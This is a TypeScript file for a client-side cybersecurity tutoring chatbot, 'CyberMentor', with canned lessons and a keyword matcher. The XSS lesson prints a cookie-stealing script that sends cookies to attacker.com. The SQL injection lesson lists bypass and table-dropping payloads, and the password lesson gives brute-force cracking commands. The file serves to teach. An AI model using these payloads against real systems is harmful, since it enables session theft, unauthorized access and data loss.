// CyberMentor Knowledge Base - Robust multi-keyword scoring algorithm
// All responses are generated client-side from this built-in knowledge base

export interface KnowledgeEntry {
  id: string;
  keywords: string[];
  title: string;
  response: string;
}

export interface ChatMessage {
  id: string;
  role: 'user' | 'assistant';
  content: string;
  imageUrl?: string;
  timestamp: Date;
}

// Warm greeting messages pool
export const GREETING_MESSAGES = [
  "👋 Hey there! I'm **CyberMentor**, your personal guide to cybersecurity, ethical hacking, and web development! Ask me anything — I'm here to help you learn and grow. 🚀",
  "🛡️ Welcome! I'm **CyberMentor** — ready to answer your questions about hacking, security, coding, and more. What would you like to explore today?",
  "💻 Hello, future cyber expert! I'm **CyberMentor**. Whether it's ethical hacking, web dev, or network security — I've got you covered. Fire away!",
  "🔐 Hi! I'm **CyberMentor**, your AI guide for all things cybersecurity and tech. Ask me about hacking techniques, coding, certifications, or anything else!",
  "⚡ Welcome to CyberMentor! I'm your AI mentor for cybersecurity, programming, and ethical hacking. What topic shall we dive into today?",
  "🌐 Hey! I'm **CyberMentor** — think of me as your knowledgeable friend in the world of cyber and tech. No question is too basic or too advanced. Let's learn together!",
  "🎯 Greetings! I'm **CyberMentor**, here to guide you through cybersecurity, ethical hacking, web development, and more. What's on your mind?",
  "🔥 Hello! I'm **CyberMentor** — your go-to AI for cybersecurity knowledge. From beginner basics to advanced techniques, I'm here to help. What do you want to learn?",
  "🧠 Hi there! I'm **CyberMentor**. Whether you're just starting out or leveling up your skills, I can help with security, coding, networking, and more. Ask away!",
  "💡 Welcome! I'm **CyberMentor** — your AI-powered cybersecurity and tech mentor. I'm ready to answer your questions, explain concepts, and help you master new skills!",
];

export const KNOWLEDGE_BASE: KnowledgeEntry[] = [
  {
    id: 'ethical-hacking',
    keywords: ['ethical hacking', 'ethical hack', 'white hat', 'penetration testing', 'pentest', 'pen test', 'hacking', 'hack', 'hacker', 'security testing', 'vulnerability assessment'],
    title: 'Ethical Hacking',
    response: `## 🔐 Ethical Hacking

**Ethical hacking** (also called penetration testing or white-hat hacking) is the practice of legally testing systems for security vulnerabilities with permission from the owner.

### Key Phases of Ethical Hacking:
1. **Reconnaissance** – Gathering information about the target (passive/active)
2. **Scanning** – Identifying open ports, services, and vulnerabilities
3. **Gaining Access** – Exploiting vulnerabilities to enter the system
4. **Maintaining Access** – Simulating persistent threats
5. **Reporting** – Documenting findings and recommendations

### Popular Tools:
- **Nmap** – Network scanning and port discovery
- **Metasploit** – Exploitation framework
- **Burp Suite** – Web application security testing
- **Wireshark** – Network traffic analysis
- **Kali Linux** – Security-focused OS with 600+ tools

### Getting Started:
- Learn networking fundamentals (TCP/IP, DNS, HTTP)
- Study the **CEH** (Certified Ethical Hacker) or **OSCP** certification
- Practice on platforms like **HackTheBox**, **TryHackMe**, or **VulnHub**

> ⚠️ Always get written permission before testing any system. Unauthorized hacking is illegal!`,
  },
  {
    id: 'cybersecurity-basics',
    keywords: ['cybersecurity', 'cyber security', 'information security', 'infosec', 'security basics', 'what is cybersecurity', 'learn security', 'security fundamentals', 'cyber'],
    title: 'Cybersecurity Basics',
    response: `## 🛡️ Cybersecurity Fundamentals

**Cybersecurity** is the practice of protecting systems, networks, and programs from digital attacks, damage, or unauthorized access.

### Core Concepts (CIA Triad):
- **Confidentiality** – Keeping data private and accessible only to authorized users
- **Integrity** – Ensuring data is accurate and hasn't been tampered with
- **Availability** – Making sure systems and data are accessible when needed

### Common Threats:
| Threat | Description |
|--------|-------------|
| Malware | Viruses, ransomware, spyware |
| Phishing | Deceptive emails/sites to steal credentials |
| SQL Injection | Injecting malicious SQL into databases |
| XSS | Cross-site scripting attacks |
| DDoS | Overwhelming servers with traffic |
| MITM | Intercepting communications |

### Security Domains:
- **Network Security** – Firewalls, IDS/IPS, VPNs
- **Application Security** – Secure coding, OWASP Top 10
- **Cloud Security** – AWS/Azure/GCP security
- **Endpoint Security** – Antivirus, EDR solutions
- **Identity & Access Management** – MFA, SSO, Zero Trust

### Career Paths:
- Security Analyst → SOC Analyst → Incident Responder
- Penetration Tester → Red Team Operator
- Security Engineer → CISO`,
  },
  {
    id: 'web-development',
    keywords: ['web development', 'web dev', 'website', 'make website', 'build website', 'create website', 'html', 'css', 'javascript', 'frontend', 'backend', 'fullstack', 'full stack', 'web app', 'web application', 'coding', 'programming', 'learn coding', 'learn programming'],
    title: 'Web Development',
    response: `## 💻 Web Development Guide

**Web development** is the process of building websites and web applications. It's divided into three main areas:

### Frontend Development (Client-Side):
\`\`\`
HTML → Structure
CSS  → Styling
JS   → Interactivity
\`\`\`
**Popular Frameworks:** React, Vue, Angular, Svelte

### Backend Development (Server-Side):
- **Languages:** Node.js, Python, PHP, Java, Go, Ruby
- **Frameworks:** Express, Django, Laravel, Spring Boot
- **Databases:** MySQL, PostgreSQL, MongoDB, Redis

### Full Stack Roadmap:
1. **HTML & CSS** – Build static pages
2. **JavaScript** – Add interactivity
3. **React/Vue** – Modern UI frameworks
4. **Node.js + Express** – Backend APIs
5. **Database** – SQL or NoSQL
6. **Git & GitHub** – Version control
7. **Deployment** – Vercel, Netlify, AWS

### Web Security Essentials:
- Always validate and sanitize user input
- Use HTTPS everywhere
- Implement proper authentication (JWT, OAuth)
- Protect against OWASP Top 10 vulnerabilities
- Use Content Security Policy (CSP) headers

### Resources to Learn:
- **freeCodeCamp** – Free full curriculum
- **The Odin Project** – Project-based learning
- **MDN Web Docs** – Official documentation`,
  },
  {
    id: 'networking',
    keywords: ['networking', 'network', 'tcp ip', 'tcp/ip', 'dns', 'http', 'https', 'ip address', 'subnet', 'router', 'firewall', 'vpn', 'osi model', 'protocols', 'packet', 'bandwidth', 'lan', 'wan', 'wifi', 'wireless'],
    title: 'Networking',
    response: `## 🌐 Computer Networking

**Networking** is the foundation of cybersecurity and the internet. Understanding how data travels is essential for any security professional.

### OSI Model (7 Layers):
| Layer | Name | Example Protocols |
|-------|------|-------------------|
| 7 | Application | HTTP, FTP, DNS, SMTP |
| 6 | Presentation | SSL/TLS, JPEG |
| 5 | Session | NetBIOS, RPC |
| 4 | Transport | TCP, UDP |
| 3 | Network | IP, ICMP, ARP |
| 2 | Data Link | Ethernet, MAC |
| 1 | Physical | Cables, Wi-Fi signals |

### Key Protocols:
- **TCP/IP** – Reliable data transmission
- **UDP** – Fast, connectionless (streaming, gaming)
- **DNS** – Translates domain names to IP addresses
- **HTTP/HTTPS** – Web communication
- **SSH** – Secure remote access
- **FTP/SFTP** – File transfer

### IP Addressing:
\`\`\`
IPv4: 192.168.1.1 (32-bit, ~4.3 billion addresses)
IPv6: 2001:0db8:85a3::8a2e:0370:7334 (128-bit)
Private ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
\`\`\`

### Security Tools for Networking:
- **Wireshark** – Packet capture and analysis
- **Nmap** – Network discovery and scanning
- **Netstat** – View active connections
- **Traceroute** – Trace packet paths`,
  },
  {
    id: 'python',
    keywords: ['python', 'python programming', 'learn python', 'python script', 'python code', 'python tutorial', 'python basics', 'python for hacking', 'python security', 'scripting'],
    title: 'Python Programming',
    response: `## 🐍 Python for Cybersecurity & Development

**Python** is the most popular language for cybersecurity, automation, and data science. It's beginner-friendly yet extremely powerful.

### Why Python for Security?
- Simple syntax — easy to learn
- Huge library ecosystem
- Used in most security tools (Metasploit modules, exploits)
- Great for automation and scripting

### Python Basics:
\`\`\`python
# Variables and data types
name = "CyberMentor"
age = 25
is_hacker = True

# Functions
def greet(name):
    return f"Hello, {name}!"

# Lists and loops
tools = ["nmap", "metasploit", "burpsuite"]
for tool in tools:
    print(f"Tool: {tool}")

# File operations
with open("passwords.txt", "r") as f:
    passwords = f.readlines()
\`\`\`

### Security-Focused Libraries:
- **Scapy** – Packet crafting and network analysis
- **Requests** – HTTP requests for web testing
- **Paramiko** – SSH connections
- **Cryptography** – Encryption/decryption
- **Socket** – Low-level networking
- **BeautifulSoup** – Web scraping

### Learning Path:
1. Variables, data types, operators
2. Control flow (if/else, loops)
3. Functions and modules
4. File I/O and error handling
5. OOP (classes and objects)
6. Libraries (requests, scapy, socket)
7. Build security tools!`,
  },
  {
    id: 'sql-injection',
    keywords: ['sql injection', 'sqli', 'sql', 'database attack', 'database security', 'injection attack', 'sqlmap', 'database vulnerability'],
    title: 'SQL Injection',
    response: `## 💉 SQL Injection (SQLi)

**SQL Injection** is one of the most critical web vulnerabilities (OWASP Top 10). It allows attackers to manipulate database queries by injecting malicious SQL code.

### How It Works:
\`\`\`sql
-- Normal query
SELECT * FROM users WHERE username='admin' AND password='pass123';

-- Injected query (bypasses authentication)
SELECT * FROM users WHERE username='admin'--' AND password='anything';
-- The -- comments out the password check!
\`\`\`

### Types of SQL Injection:
1. **Classic/In-band** – Results returned directly in response
2. **Blind SQLi** – No direct output, infer from behavior
3. **Time-based Blind** – Use SLEEP() to infer data
4. **Out-of-band** – Data exfiltrated via DNS/HTTP

### Common Payloads:
\`\`\`sql
' OR '1'='1          -- Always true
' OR 1=1--           -- Comment out rest
'; DROP TABLE users-- -- Destructive
' UNION SELECT 1,2,3-- -- Union-based extraction
\`\`\`

### Prevention:
- ✅ Use **parameterized queries** / prepared statements
- ✅ Use an **ORM** (SQLAlchemy, Hibernate)
- ✅ **Input validation** and sanitization
- ✅ **Least privilege** database accounts
- ✅ **WAF** (Web Application Firewall)

### Testing Tools:
- **SQLMap** – Automated SQL injection tool
- **Burp Suite** – Manual testing proxy`,
  },
  {
    id: 'xss',
    keywords: ['xss', 'cross site scripting', 'cross-site scripting', 'script injection', 'javascript injection', 'stored xss', 'reflected xss', 'dom xss'],
    title: 'Cross-Site Scripting (XSS)',
    response: `## ⚡ Cross-Site Scripting (XSS)

**XSS** allows attackers to inject malicious scripts into web pages viewed by other users. It's consistently in the OWASP Top 10.

### Types of XSS:
1. **Reflected XSS** – Script in URL, executed immediately
2. **Stored XSS** – Script saved in database, affects all visitors
3. **DOM-based XSS** – Manipulates the DOM without server interaction

### Example Attack:
\`\`\`html
<!-- Malicious input in a comment field -->
<script>
  document.location='https://attacker.com/steal?cookie='+document.cookie;
</script>

<!-- Or simpler test payload -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
\`\`\`

### What Attackers Can Do:
- Steal session cookies
- Redirect users to phishing sites
- Keylog user input
- Deface websites
- Perform actions on behalf of users

### Prevention:
- ✅ **Encode output** – HTML encode all user data
- ✅ **Content Security Policy (CSP)** headers
- ✅ **HttpOnly cookies** – Prevent JS cookie access
- ✅ **Input validation** – Whitelist allowed characters
- ✅ Use modern frameworks (React auto-escapes by default)`,
  },
  {
    id: 'linux',
    keywords: ['linux', 'kali linux', 'ubuntu', 'terminal', 'command line', 'bash', 'shell', 'linux commands', 'linux tutorial', 'unix', 'cli', 'command prompt'],
    title: 'Linux & Command Line',
    response: `## 🐧 Linux for Cybersecurity

**Linux** is the operating system of choice for security professionals. Kali Linux comes pre-loaded with 600+ security tools.

### Essential Linux Commands:
\`\`\`bash
# Navigation
ls -la          # List files with details
cd /path/to/dir # Change directory
pwd             # Print working directory
find / -name "*.txt" # Find files

# File operations
cat file.txt    # Display file contents
grep "pattern" file.txt  # Search in files
chmod 755 script.sh      # Change permissions
chown user:group file    # Change ownership

# Network commands
ifconfig / ip addr  # Show network interfaces
netstat -tulpn      # Show open ports
ping google.com     # Test connectivity
curl https://api.example.com  # HTTP requests

# Process management
ps aux          # List all processes
kill -9 PID     # Force kill process
top / htop      # System monitor
\`\`\`

### Kali Linux Security Tools:
- **nmap** – \`nmap -sV -p- target.com\`
- **metasploit** – \`msfconsole\`
- **aircrack-ng** – WiFi security testing
- **john** – Password cracking
- **hydra** – Brute force attacks
- **nikto** – Web server scanner

### File Permissions:
\`\`\`
rwxrwxrwx = 777 (owner/group/others)
r=4, w=2, x=1
chmod 644 file = rw-r--r--
\`\`\``,
  },
  {
    id: 'cryptography',
    keywords: ['cryptography', 'encryption', 'decryption', 'cipher', 'hash', 'hashing', 'aes', 'rsa', 'ssl', 'tls', 'certificate', 'public key', 'private key', 'md5', 'sha', 'base64', 'crypto'],
    title: 'Cryptography',
    response: `## 🔑 Cryptography Fundamentals

**Cryptography** is the science of securing information through mathematical algorithms. It's the backbone of all modern security.

### Types of Encryption:
**Symmetric Encryption** (same key for encrypt/decrypt):
- AES-256 – Industry standard, very secure
- DES/3DES – Older, mostly deprecated
- ChaCha20 – Fast, used in TLS 1.3

**Asymmetric Encryption** (public/private key pair):
- RSA – Most common, used in SSL/TLS
- ECC – Elliptic Curve, smaller keys, faster
- Diffie-Hellman – Key exchange protocol

### Hashing Algorithms:
\`\`\`
MD5    → 128-bit hash (BROKEN - don't use for security)
SHA-1  → 160-bit hash (DEPRECATED)
SHA-256 → 256-bit hash (SECURE ✅)
SHA-512 → 512-bit hash (VERY SECURE ✅)
bcrypt  → Password hashing with salt (RECOMMENDED ✅)
\`\`\`

### How HTTPS Works:
1. Client requests HTTPS connection
2. Server sends SSL certificate (public key)
3. Client verifies certificate with CA
4. Key exchange (TLS handshake)
5. Symmetric session key established
6. Encrypted communication begins

### Common Crypto Attacks:
- **Brute Force** – Try all possible keys
- **Rainbow Tables** – Pre-computed hash lookups
- **Birthday Attack** – Hash collision exploitation
- **Padding Oracle** – CBC mode vulnerability`,
  },
  {
    id: 'social-engineering',
    keywords: ['social engineering', 'phishing', 'spear phishing', 'vishing', 'smishing', 'pretexting', 'baiting', 'tailgating', 'human hacking', 'manipulation'],
    title: 'Social Engineering',
    response: `## 🎭 Social Engineering

**Social engineering** exploits human psychology rather than technical vulnerabilities. It's often the easiest way to breach security.

### Types of Social Engineering:
1. **Phishing** – Fake emails mimicking legitimate organizations
2. **Spear Phishing** – Targeted phishing with personalized info
3. **Vishing** – Voice/phone-based deception
4. **Smishing** – SMS-based phishing
5. **Pretexting** – Creating a fabricated scenario
6. **Baiting** – Leaving infected USB drives
7. **Tailgating** – Following someone into a secure area

### Phishing Red Flags:
- ⚠️ Urgent language ("Act now!", "Account suspended!")
- ⚠️ Suspicious sender email address
- ⚠️ Hover over links — URL doesn't match
- ⚠️ Generic greetings ("Dear Customer")
- ⚠️ Requests for sensitive information
- ⚠️ Poor grammar and spelling

### Defense Strategies:
- **Security Awareness Training** – Educate employees
- **Email Filtering** – Block suspicious emails
- **MFA** – Even if credentials stolen, account protected
- **Verify Requests** – Call back on known numbers
- **Zero Trust** – Never trust, always verify

### Famous Social Engineering Attacks:
- **Kevin Mitnick** – World's most famous social engineer
- **Twitter Bitcoin Scam (2020)** – Compromised 130 accounts
- **RSA SecurID Breach** – Phishing email led to major breach`,
  },
  {
    id: 'malware',
    keywords: ['malware', 'virus', 'ransomware', 'trojan', 'worm', 'spyware', 'adware', 'rootkit', 'keylogger', 'botnet', 'antivirus', 'malicious software'],
    title: 'Malware',
    response: `## 🦠 Malware Analysis & Defense

**Malware** (malicious software) is any software designed to harm, exploit, or gain unauthorized access to systems.

### Types of Malware:
| Type | Description | Example |
|------|-------------|---------|
| Virus | Self-replicating, attaches to files | ILOVEYOU |
| Worm | Self-spreading via networks | WannaCry |
| Trojan | Disguised as legitimate software | Zeus |
| Ransomware | Encrypts files, demands payment | CryptoLocker |
| Spyware | Secretly monitors user activity | FinFisher |
| Rootkit | Hides malware from OS | Stuxnet |
| Keylogger | Records keystrokes | Various |
| Botnet | Network of infected machines | Mirai |

### How Malware Spreads:
- Phishing email attachments
- Malicious downloads
- Drive-by downloads (visiting infected sites)
- USB drives
- Software vulnerabilities

### Defense & Prevention:
- ✅ Keep OS and software updated
- ✅ Use reputable antivirus/EDR
- ✅ Don't open suspicious attachments
- ✅ Regular backups (3-2-1 rule)
- ✅ Use a firewall
- ✅ Principle of least privilege

### Malware Analysis Tools:
- **VirusTotal** – Online malware scanner
- **Any.run** – Interactive malware sandbox
- **Ghidra** – Reverse engineering (NSA tool)
- **IDA Pro** – Professional disassembler`,
  },
  {
    id: 'certifications',
    keywords: ['certification', 'certifications', 'ceh', 'oscp', 'cissp', 'comptia', 'security+', 'cisa', 'cism', 'ejpt', 'pnpt', 'career', 'job', 'salary', 'cybersecurity career'],
    title: 'Cybersecurity Certifications',
    response: `## 🏆 Cybersecurity Certifications Guide

Certifications validate your skills and significantly boost your career prospects and salary.

### Beginner Certifications:
| Cert | Provider | Focus | Cost |
|------|----------|-------|------|
| CompTIA Security+ | CompTIA | Security fundamentals | ~$370 |
| eJPT | eLearnSecurity | Penetration testing | ~$200 |
| Google Cybersecurity | Google | Entry-level security | Free (Coursera) |
| CC | (ISC)² | Security concepts | Free |

### Intermediate Certifications:
| Cert | Provider | Focus | Cost |
|------|----------|-------|------|
| CEH | EC-Council | Ethical hacking | ~$1,000 |
| PNPT | TCM Security | Practical pentesting | ~$400 |
| CySA+ | CompTIA | Security analytics | ~$370 |

### Advanced Certifications:
| Cert | Provider | Focus | Cost |
|------|----------|-------|------|
| OSCP | Offensive Security | Penetration testing | ~$1,499 |
| CISSP | (ISC)² | Security management | ~$699 |
| CISM | ISACA | Security management | ~$575 |

### Recommended Learning Path:
1. **CompTIA Security+** → Foundation
2. **CEH or eJPT** → Ethical hacking basics
3. **OSCP** → Advanced penetration testing
4. **CISSP** → Management/leadership

### Salary Ranges (US):
- Entry Level: $60,000 - $80,000
- Mid Level: $80,000 - $120,000
- Senior Level: $120,000 - $180,000+`,
  },
  {
    id: 'ctf',
    keywords: ['ctf', 'capture the flag', 'hackthebox', 'tryhackme', 'vulnhub', 'practice hacking', 'wargames', 'challenges', 'picoctf', 'overthewire'],
    title: 'CTF & Practice Platforms',
    response: `## 🚩 CTF & Hacking Practice Platforms

**Capture The Flag (CTF)** competitions are the best way to practice ethical hacking skills in a legal, controlled environment.

### Top Practice Platforms:
**Beginner-Friendly:**
- 🟢 **TryHackMe** (tryhackme.com) – Guided learning paths, browser-based
- 🟢 **PicoCTF** – Free, beginner CTF by Carnegie Mellon
- 🟢 **OverTheWire** – Linux/security wargames

**Intermediate:**
- 🟡 **HackTheBox** (hackthebox.com) – Real-world machines
- 🟡 **VulnHub** – Downloadable vulnerable VMs
- 🟡 **DVWA** – Damn Vulnerable Web Application

**Advanced:**
- 🔴 **HackTheBox Pro Labs** – Enterprise network simulations
- 🔴 **PentesterLab** – Web application security
- 🔴 **SANS NetWars** – Professional competitions

### CTF Categories:
- **Web** – SQL injection, XSS, SSRF, authentication bypass
- **Crypto** – Cipher breaking, hash cracking
- **Forensics** – File analysis, steganography
- **Reverse Engineering** – Analyzing binaries
- **Pwn/Binary Exploitation** – Buffer overflows
- **OSINT** – Open source intelligence

### Tips for CTF Success:
1. Start with TryHackMe beginner rooms
2. Learn basic Linux commands first
3. Master one category before moving to others
4. Read writeups after solving (or failing) challenges
5. Join CTF teams and communities`,
  },
  {
    id: 'owasp',
    keywords: ['owasp', 'owasp top 10', 'web vulnerabilities', 'web security', 'application security', 'appsec', 'broken authentication', 'security misconfiguration', 'insecure deserialization'],
    title: 'OWASP Top 10',
    response: `## 🔟 OWASP Top 10 Web Vulnerabilities

The **OWASP Top 10** is the definitive list of the most critical web application security risks.

### OWASP Top 10 (2021):
1. **A01 - Broken Access Control** 🔴
   - Users accessing unauthorized resources
   - Prevention: Implement proper authorization checks

2. **A02 - Cryptographic Failures** 🔴
   - Weak encryption, exposed sensitive data
   - Prevention: Use strong encryption (AES-256, TLS 1.3)

3. **A03 - Injection** 🔴
   - SQL, NoSQL, OS, LDAP injection
   - Prevention: Parameterized queries, input validation

4. **A04 - Insecure Design** 🟠
   - Flaws in architecture and design
   - Prevention: Threat modeling, secure design patterns

5. **A05 - Security Misconfiguration** 🟠
   - Default credentials, unnecessary features enabled
   - Prevention: Hardening guides, regular audits

6. **A06 - Vulnerable Components** 🟠
   - Outdated libraries with known CVEs
   - Prevention: Regular dependency updates, SCA tools

7. **A07 - Auth & Identity Failures** 🟡
   - Weak passwords, missing MFA
   - Prevention: Strong password policies, MFA

8. **A08 - Software & Data Integrity** 🟡
   - Insecure CI/CD, unsigned updates
   - Prevention: Code signing, integrity checks

9. **A09 - Security Logging Failures** 🟡
   - Insufficient logging and monitoring
   - Prevention: Comprehensive audit logs, SIEM

10. **A10 - SSRF** 🟡
    - Server-Side Request Forgery
    - Prevention: Validate/sanitize all URLs`,
  },
  {
    id: 'password-security',
    keywords: ['password', 'passwords', 'password security', 'password cracking', 'brute force', 'dictionary attack', 'rainbow table', 'password manager', 'strong password', 'mfa', 'two factor', '2fa', 'authentication'],
    title: 'Password Security',
    response: `## 🔑 Password Security & Authentication

Passwords are the first line of defense. Understanding how they're attacked helps you defend them better.

### Password Cracking Techniques:
1. **Brute Force** – Try every possible combination
2. **Dictionary Attack** – Try common words/passwords
3. **Rainbow Table** – Pre-computed hash lookups
4. **Credential Stuffing** – Use leaked password databases
5. **Mask Attack** – Pattern-based (e.g., Word + 4 digits)

### Password Cracking Tools:
\`\`\`bash
# Hashcat - GPU-accelerated password cracking
hashcat -m 0 hashes.txt wordlist.txt  # MD5
hashcat -m 1800 hashes.txt wordlist.txt  # SHA-512

# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Hydra - Online brute force
hydra -l admin -P passwords.txt ssh://target.com
\`\`\`

### Creating Strong Passwords:
- ✅ Minimum 12 characters
- ✅ Mix of uppercase, lowercase, numbers, symbols
- ✅ Use passphrases: "Coffee$Laptop#Mountain2024"
- ✅ Unique password for every account
- ✅ Use a password manager (Bitwarden, 1Password)

### Multi-Factor Authentication (MFA):
- **Something you know** – Password/PIN
- **Something you have** – Phone/hardware key
- **Something you are** – Fingerprint/face

> 🔐 Enable MFA on all important accounts — it blocks 99.9% of automated attacks!`,
  },
  {
    id: 'cloud-security',
    keywords: ['cloud', 'cloud security', 'aws', 'azure', 'gcp', 'google cloud', 'cloud computing', 'cloud hacking', 's3 bucket', 'iam', 'cloud misconfiguration'],
    title: 'Cloud Security',
    response: `## ☁️ Cloud Security

Cloud security is one of the fastest-growing areas in cybersecurity as organizations migrate to AWS, Azure, and GCP.

### Common Cloud Vulnerabilities:
1. **Misconfigured S3 Buckets** – Public access to sensitive data
2. **Overprivileged IAM Roles** – Excessive permissions
3. **Exposed API Keys** – Credentials in code/repos
4. **Insecure APIs** – Unauthenticated endpoints
5. **Lack of Encryption** – Data at rest/transit unencrypted

### AWS Security Best Practices:
\`\`\`
✅ Enable MFA on root account
✅ Use IAM roles, not root credentials
✅ Enable CloudTrail for audit logging
✅ Enable GuardDuty for threat detection
✅ Encrypt S3 buckets and RDS databases
✅ Use VPC with proper security groups
✅ Regular security assessments
\`\`\`

### Cloud Security Tools:
- **ScoutSuite** – Multi-cloud security auditing
- **Prowler** – AWS security assessment
- **CloudMapper** – AWS environment visualization
- **Pacu** – AWS exploitation framework (pentesting)
- **Trivy** – Container/IaC vulnerability scanner

### Cloud Security Certifications:
- AWS Certified Security – Specialty
- Google Professional Cloud Security Engineer
- Microsoft Azure Security Engineer (AZ-500)
- CCSP (Certified Cloud Security Professional)`,
  },
];

// Tokenize text into words
function tokenize(text: string): string[] {
  return text
    .toLowerCase()
    .replace(/[^a-z0-9\s]/g, ' ')
    .split(/\s+/)
    .filter(w => w.length > 1);
}

// Calculate relevance score between query and knowledge entry
function scoreEntry(queryTokens: string[], entry: KnowledgeEntry): number {
  const queryText = queryTokens.join(' ');
  let score = 0;

  for (const keyword of entry.keywords) {
    const kwLower = keyword.toLowerCase();
    // Exact phrase match in original query text
    if (queryText.includes(kwLower)) {
      score += kwLower.split(' ').length * 10; // Multi-word phrases score higher
    }
    // Token-level partial match
    const kwTokens = tokenize(keyword);
    for (const kwToken of kwTokens) {
      if (queryTokens.includes(kwToken)) {
        score += 3;
      }
      // Partial token match (e.g., "hack" matches "hacking")
      for (const qt of queryTokens) {
        if (qt.startsWith(kwToken) || kwToken.startsWith(qt)) {
          score += 1;
        }
      }
    }
  }

  return score;
}

// Find the best matching knowledge entry
export function findBestMatch(query: string): KnowledgeEntry | null {
  const queryTokens = tokenize(query);
  if (queryTokens.length === 0) return null;

  let bestEntry: KnowledgeEntry | null = null;
  let bestScore = 0;

  for (const entry of KNOWLEDGE_BASE) {
    const score = scoreEntry(queryTokens, entry);
    if (score > bestScore) {
      bestScore = score;
      bestEntry = entry;
    }
  }

  // Return best match if score is above threshold
  return bestScore >= 3 ? bestEntry : null;
}

// Generate a fallback response when no strong match is found
export function generateFallbackResponse(query: string): string {
  const topics = KNOWLEDGE_BASE.map(e => `**${e.title}**`).join(', ');
  return `## 🤔 I'm not sure about that specific topic

I couldn't find a precise match for your question: *"${query}"*

### 📚 Topics I Can Help With:
${KNOWLEDGE_BASE.map(e => `- ${e.title}`).join('\n')}

### 💡 Try asking about:
- "What is ethical hacking?"
- "How does SQL injection work?"
- "Explain cryptography basics"
- "What certifications should I get for cybersecurity?"
- "How do I start learning web development?"

### 🔍 Or rephrase your question with keywords like:
${topics}

Feel free to ask anything about cybersecurity, hacking, networking, programming, or web development — I'm here to help! 🚀`;
}

// Get a random greeting message
export function getRandomGreeting(): string {
  return GREETING_MESSAGES[Math.floor(Math.random() * GREETING_MESSAGES.length)];
}

// Main function to get a response for a user query
export function getCyberMentorResponse(query: string): string {
  if (!query || query.trim().length === 0) {
    return "Please ask me a question! I'm here to help with cybersecurity, hacking, networking, and web development topics. 😊";
  }

  const match = findBestMatch(query);
  if (match) {
    return match.response;
  }

  return generateFallbackResponse(query);
}
